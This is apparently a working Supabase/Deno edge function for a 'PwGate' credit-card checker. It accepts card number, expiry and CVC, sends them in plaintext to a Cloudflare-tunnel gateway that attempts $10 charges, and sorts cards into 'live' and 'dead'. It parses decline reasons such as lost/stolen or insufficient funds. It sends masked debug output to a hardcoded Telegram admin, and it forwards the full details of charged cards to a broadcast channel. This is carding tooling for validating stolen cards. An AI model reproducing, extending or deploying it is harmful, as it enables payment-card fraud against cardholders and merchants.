import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_CHAT_ID = "8496943061";

const API_BASE_URL = "https://tba-bike-internet-different.trycloudflare.com/api";

// Fast status detection from API response
const parseApiResponse = (rawText: string): { status: string; message: string } => {
  if (!rawText || rawText.trim() === '') {
    return { status: 'unknown', message: 'Empty response' };
  }
  
  try {
    const json = JSON.parse(rawText);
    
    // Priority: Direct message fields (use exactly as-is)
    let directMessage: string | undefined;
    if (json.message && typeof json.message === 'string') {
      directMessage = json.message.trim();
    } else if (json.error?.message && typeof json.error.message === 'string') {
      directMessage = json.error.message.trim();
    } else if (json.error && typeof json.error === 'string') {
      directMessage = json.error.trim();
    } else if (json.msg && typeof json.msg === 'string') {
      directMessage = json.msg.trim();
    }
    
    // Check result.success - 0 = DECLINED, any other = CHARGED
    if (json.result?.success !== undefined) {
      const isLive = json.result.success !== 0;
      const formHTML = json.result?.secure?.formHTML || '';
      
      // Use direct message or extract from formHTML
      const message = directMessage || extractFromHtml(formHTML, isLive);
      return { status: isLive ? 'live' : 'dead', message };
    }
    
    // Fallback: use direct message with keyword detection
    if (directMessage) {
      const lower = directMessage.toLowerCase();
      if (lower.includes('declined') || lower.includes('failed') || lower.includes('error') || lower.includes('invalid')) {
        return { status: 'dead', message: directMessage };
      }
      if (lower.includes('success') || lower.includes('charged') || lower.includes('approved')) {
        return { status: 'live', message: directMessage };
      }
      return { status: 'unknown', message: directMessage };
    }
    
    return { status: 'unknown', message: 'Unable to parse response' };
  } catch {
    // Non-JSON response - keyword detection
    const lower = rawText.toLowerCase();
    if (lower.includes('declined') || lower.includes('failed')) {
      return { status: 'dead', message: 'Declined' };
    }
    if (lower.includes('charged') || lower.includes('success')) {
      return { status: 'live', message: 'Approved' };
    }
    return { status: 'unknown', message: 'Unable to parse response' };
  }
};

// Extract message from formHTML
const extractFromHtml = (html: string, isLive: boolean): string => {
  if (!html) return isLive ? 'Charged successfully' : 'Declined';
  
  const lower = html.toLowerCase();
  
  // 3D Secure indicators
  if (lower.includes('3dsecure') || lower.includes('3d secure') || lower.includes('3ds') ||
      lower.includes('pareq') || lower.includes('acsurl') || lower.includes('authentication')) {
    return '3D Secure authentication required';
  }
  
  // Common decline patterns
  if (lower.includes('insufficient funds')) return 'Insufficient funds';
  if (lower.includes('expired card') || lower.includes('card expired')) return 'Card expired';
  if (lower.includes('invalid card')) return 'Invalid card number';
  if (lower.includes('invalid cvv') || lower.includes('cvv mismatch')) return 'Invalid security code';
  if (lower.includes('do not honor')) return 'Card declined - Do not honor';
  if (lower.includes('lost card') || lower.includes('stolen card')) return 'Card reported lost/stolen';
  if (lower.includes('fraud')) return 'Fraud suspected';
  if (lower.includes('limit exceeded')) return 'Transaction limit exceeded';
  if (lower.includes('restricted card')) return 'Card restricted';
  
  return isLive ? 'Charged successfully' : 'Declined';
};

// Direct API call - optimized for speed
const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}`;
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 30000); // 30s timeout for speed
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    
    const result = parseApiResponse(rawText);
    return { ...result, rawResponse: rawText };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Error';
    return { status: 'unknown', message: 'Request timeout or error', rawResponse: errMsg };
  }
};

// Send debug to admin via Telegram - ONLY for UNKNOWN status (fire-and-forget)
const sendAdminDebug = (cc: string, status: string, rawResponse: string, message: string) => {
  if (status !== 'unknown' || !TELEGRAM_BOT_TOKEN) return;
  
  const parts = cc.split('|');
  const maskedCard = parts[0] ? 
    `${parts[0].slice(0, 6)}******${parts[0].slice(-4)}|${parts[1] || '**'}|${parts[2] || '**'}|***` : 
    'Invalid format';
  
  const truncatedRaw = rawResponse.length > 3000 ? 
    rawResponse.substring(0, 3000) + '\n... [truncated]' : 
    rawResponse;
  
  const text = `❓ <b>PwGate Debug (UNKNOWN)</b>\n\n` +
    `<b>Card:</b> <code>${maskedCard}</code>\n` +
    `<b>Message:</b> ${message}\n\n` +
    `<b>Raw Response:</b>\n<pre>${truncatedRaw.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`;
  
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: ADMIN_CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    })
  }).catch(() => {});
};

// Notify charged card - broadcasts to channel (fire-and-forget)
const notifyChargedCard = (userId: string, cardDetails: string, message: string) => {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      userId,
      cardDetails,
      status: 'CHARGED',
      responseMessage: message,
      amount: '$10',
      gateway: 'PwGate',
    }),
  }).catch(() => {});
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Parse body first (fast)
    const body = await req.json();
    const { cc } = body;
    
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Quick format validation
    const parts = cc.split('|');
    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Start API call immediately - don't wait for auth
    const apiPromise = callApi(cc);

    // Auth check in parallel with API call
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    // Run auth and ban check in parallel
    const [authResult, profileResult] = await Promise.all([
      supabase.auth.getUser(),
      // We need userId first, so this will be sequential after auth
      Promise.resolve(null) // placeholder
    ]);

    const { data: { user }, error: authError } = authResult;
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Ban check (fast query)
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Wait for API result
    const result = await apiPromise;
    
    // Fire-and-forget notifications
    sendAdminDebug(cc, result.status, result.rawResponse, result.message);
    if (result.status === 'live') {
      notifyChargedCard(user.id, cc, result.message);
    }
    
    return new Response(
      JSON.stringify({
        computedStatus: result.status,
        apiStatus: result.status === 'live' ? 'CHARGED' : result.status === 'dead' ? 'DECLINED' : 'UNKNOWN',
        apiMessage: result.message,
        apiTotal: '$10',
        chargeAmount: '$10',
        status: result.status,
        message: result.message,
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
